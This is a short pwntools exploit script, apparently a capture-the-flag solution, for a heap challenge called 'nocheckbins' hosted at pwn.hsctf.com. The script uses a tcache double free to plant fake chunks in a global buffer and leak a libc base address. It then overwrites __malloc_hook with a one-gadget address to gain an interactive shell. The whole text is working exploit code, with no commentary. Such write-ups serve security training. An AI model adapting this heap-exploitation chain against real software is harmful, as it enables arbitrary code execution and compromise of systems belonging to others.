from pwn import *

e = ELF("./nocheckbins")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("pwn.hsctf.com", 2222)
else:
  p = process(e.path)

def alloc(size=0x18, payload="AAAA"):
  p.sendlineafter(">", "1")
  p.sendlineafter(">", str(size))
  p.sendafter(">", payload + ("" if len(payload) == size else "\n"))
    
def free():
  p.sendlineafter(">", "2")

p.sendlineafter(">", "A" * 8 + p64(0x91) + p64(e.symbols["name"] + 0x10))


alloc()

free()
free()
alloc(payload=p64(e.symbols["name"] + 0x10))
alloc()
alloc(payload=p64(e.symbols["name"] + 0x10))
free()
free()
alloc(size=0x80, payload=p64(e.symbols["name"] + 0x10))
alloc(size=0x80, payload=p64(e.symbols["name"] + 0x10))
alloc(size=0x80, payload=p64(e.symbols["name"] + 0x10))
alloc(size=0xf8, payload="NEW")
free()
free()
alloc(size=0xf8, payload=p64(e.symbols["name"] + 0x10))
alloc(size=0xf8)
alloc(size=0xf8, payload="A" * 0x18 + p64(e.symbols["name"] + 0x10) + "A" * 0x60 + p64(0x80) +  p64(0x21) + "A" * 0x18 + p64(0x21))
free()

p.sendlineafter(">", "3")
p.recvuntil("o: :")
libc_base = u64(p.recvline(keepends=False)[16:24].ljust(8, "\x00")) - 0x7f4cbc444ca0 + 0x00007f4cbc059000
print("Libc Base: {:#x}".format(libc_base))

alloc(size=0x80, payload=p64(e.symbols["name"] + 0x10))
alloc(size=0x8, payload=p64(libc_base + libc.symbols["__malloc_hook"]))
alloc(size=0x8)
alloc(size=0x8, payload=p64(libc_base + 0x10a38c))
p.sendlineafter(">", "1")
p.sendlineafter(">", "1")
p.interactive()
